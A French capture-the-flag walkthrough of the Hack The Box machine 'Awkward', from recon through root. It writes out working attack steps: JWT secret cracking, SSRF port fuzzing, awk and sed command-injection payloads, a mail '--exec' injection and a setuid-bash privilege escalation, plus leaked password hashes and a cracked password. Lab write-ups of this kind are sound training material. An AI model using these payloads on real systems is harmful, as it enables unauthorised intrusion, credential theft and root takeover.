# Awkward - Medium

```bash
nmap -sV -sC 10.10.11.185
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-20 15:59 EST
Nmap scan report for 10.10.11.185
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```

Le serveur web est au nom de domaine hat-valley

```bash
http://hat-valley.htb/
```

On lance un gobuster dir en attendant, pas de champs injectables ou d’éléments perticulier à analyser

On découvre un subdomain:

```bash
gobuster vhost -u http://hat-valley.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
Found: store.hat-valley.htb (Status: 401) [Size: 188]
```

Un prompt nous demande de nous connecter, après avoir tester les valeurs les plus connues, on lance un gobuster encore une fois.

On trouve le dossier product-details mais il est bloqué par le mdp. On teste alors avec:

[https://github.com/iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403)

Ne marche pas, on remarque avec burpsuite que lorsque l’on envoie les creds on envoie comme authorisation l’username suivi du mdp qui est ensuite passé en base64 à partir de cette forme:

```bash
username:password
```

Mais on ne va pas essayer de bruteforce, quelque chose doit manquer dans le recon. Dans le code source de la page du site de base on remarque le javascript app.js qui est mal formaté donc on va sur [https://beautifier.io/](https://beautifier.io/) pour le lire. Dans le code (très bien caché), il est mentionné un href vers le dossier /hr qui nous amène sur une page de login. On essaye les mdp classiques mais rien ne marche alors on analyse avec burpsuite.

```bash
Cookie: token=guest
```

On essaye de remplacer par admin et on tombe sur le dashboard. Apparemment tout est en JS. Rien de très fonctionnel sur ce dashboard. Dans “network” de la page d’inspection on voit que la page fait un appel qui finit en erreur 500 vers la page api/staff-details. La page affiche une erreur:

```bash
JsonWebTokenError: jwt malformed
    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
    at /var/www/hat-valley.htb/server/server.js:151:30
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)
```

En enlevant le cookie on tombe sur l’ensemble des informations sur les utilisateurs:

```json
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]

```

C’est peut être du sha256 donc on va essayer de le cracker avec john:

```bash
sudo john creds.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

On trouve donc un mot de passe, on va tester de se log en tant qu’un autre utilisateur. C’était le compte de chris et on tombe sur son dashboard

On peut maintenant faire des requêtes de congés donc on va tenter des injections dans le champ du nom. Pas possible de poster quand il y a des balises pour javascript donc pas possible d’injecter à priori.

Notre token JWT est cependant:

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc3MDk0NzM1fQ.NZZGdHIaEJfyXcu5t6oL7tcqtMOw2Nd2QVhUB5ODmnc
```

On va donc encore utiliser john:

[https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py](https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py)

```bash
./jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc3MDk0NzM1fQ.NZZGdHIaEJfyXcu5t6oL7tcqtMOw2Nd2QVhUB5ODmnc > ../machines/awkward/token.john

john token.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123beany123      (?)
1g 0:00:00:01 DONE (2023-02-22 20:52) 0.5649g/s 7534Kp/s 7534Kc/s 7534KC/s 123erix..1234ถุ
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On suppose donc que c’est le mdp de Bean Hill. On remarque aussi dans la catégorie network ceci:

```bash
http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22
```

Ce qui pointe vers le sous domaine trouvé précedemment. Si on fait ceci:

```bash
http://hat-valley.htb/api/store-status?url=%22http://localhost%22
```

On est redirigé vers la page d’acceuil, on pourrait alors essayer de fuzzer l’url et trouver un service qui écoute en internet sur cette URL. On va donc utiliser ffuf:

```bash
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0
```

-fs 0 pour exclure les réponses vides. On tombe alors sur plusieurs ports:

```bash
3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 164ms]
8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 216ms]
```

On va consulter 3002 d’abord, on tombe sur une page avec plein d’informations sur l’api et du code source. On comprend alors pourquoi on ne pouvait pas injecter les champs 😟. 

```jsx
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  let authFailed = false
  let user = null

  if (user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)

    if (!decodedToken.username) {
      authFailed = true
    } else {
      user = decodedToken.username
    }
  }

  if (authFailed) {
    return res.status(401).json({ Error: "Invalid Token" })
  }

  if (!user) {
    return res.status(500).send("Invalid user")
  }

  const bad = [";", "&", "|", ">", "<", "*", "?", "`", "$", "(", ")", "{", "}", "[", "]", "!", "#"]
  const badInUser = bad.some(char => user.includes(char))

  if (badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  exec(`awk '/${user}/' /var/www/private/leave_requests.csv`, { encoding: 'binary', maxBuffer: 51200000 }, (error, stdout, stderr) => {
    if (stdout) {
      return res.status(200).send(Buffer.from(stdout, 'binary'))
    }

    if (error || stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})

```

On voit qu’on peut sûrement injecter quelque chose dans le awk. Cette commande cherche les occurences. Selon GTFO pour lire un fichier:

```bash
awk '//' "$LFILE"
```

On peut tester sur notre machine et ça fonctionne:

```bash
awk '//' /etc/passwd test123
```

Il nous faut maintenant forger un token avec comme user le fichier désiré sur [https://jwt.io/](https://jwt.io/) avec notre payload /' /etc/passwd ‘ :

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzcwOTQ3MzV9._nHauLRSmErB9_9vw7_3txigFLxhi0OsozXLHdSO-Xo
```

Il y a deux utilisateurs: bean et christine: on essaye de se connecter via ssh. ça ne marche pas donc on peut chercher clés SSH mais c’est sans succès, on essaye alors le .bashrc et on remarque cela:

```bash
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

On essaye alors de le télécharger:

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Téléchargons donc ce backup et on tombe sur le home de l’utilisateur

Dans .config on trouve le mdp de bean.

Cette fois-ci le store.hat-valley.htb peut servir. On essaye de se connecter en tant que Bean mais ça ne marche pas, alors on cherche les fichiers de conf dans /etc/nginx/conf.d/.htpasswd

```bash
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

On essaye de se connecter avec le mdp précédent parce qu’il était écrit de l’utiliser partout et on est log. Rien de particulier sur le site en lui même. Cependant vu que l’on a accès aux fichiers du serveur on va les analyser. 

On remarque que cart_actions.php utilise la commande sed:

```bash
system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
```

[https://gtfobins.github.io/gtfobins/sed/](https://gtfobins.github.io/gtfobins/sed/) 

Sauf qu’il faut utiliser le flag -e pour donner un script plutôt que d’écrire la commande, à cause des vérifs faites en amont.

Voici notre payload:

```bash
' -e "1e /tmp/shell.sh" /tmp/shell.sh '
```

On crée donc le shell en premier. Ensuite il faut ajouter un item dans notre panier pour qu’il apparaisse dans la liste des fichiers du panier sur la machine. On modifie le fichier pour changer son item_id et y insérer le notre. Ensuite on intercepte la requête avec burp lorsque l’on delete l’objet du panier. Ici il faut encoder en URL notre payload. On obtient alors un shell en tant que www-data.

On remarque ceci dans ps -aux:

```bash
inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
```

En regardant le fichier on voit qu’il lance la commande mail en tant que root lors que l’on modifie ce fichier via la notification de modification: **[https://gtfobins.github.io/gtfobins/mail/](https://gtfobins.github.io/gtfobins/mail/)**

```bash
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
```

On créée alors un script root.sh:

```bash
#!/bin/bash
chmod +s /bin/bash
```

On exploite alors la faille:

```bash
echo '" --exec="\!/tmp/root.sh"' >> leave_requests.csv
```

Et on a enfin le flag ! 

```bash
/bin/bash -p
whoami
root
cd /root
cat root.txt
```